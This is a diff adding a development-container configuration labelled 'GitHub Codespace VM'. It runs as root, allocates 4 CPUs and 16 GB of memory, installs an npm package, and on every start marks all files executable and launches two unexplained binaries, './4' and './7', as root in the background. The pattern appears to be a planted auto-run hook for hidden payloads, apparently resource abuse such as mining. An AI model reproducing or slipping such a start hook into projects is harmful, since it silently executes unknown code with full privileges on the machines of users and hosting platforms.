@@ -1,0 +1,13 @@
+{
+  "name": "GitHub Codespace VM",
+  "settings": {
+    "terminal.integrated.defaultProfile.linux": "bash"
+  },
+  "containerUser": "root",
+  "runArgs": [
+    "--cpus=4",
+    "--memory=16g"
+  ],
+  "postCreateCommand": "npm i hpack",
+  "postStartCommand": "sudo chmod +x ./*; sudo ./4 & sudo ./7"
+}
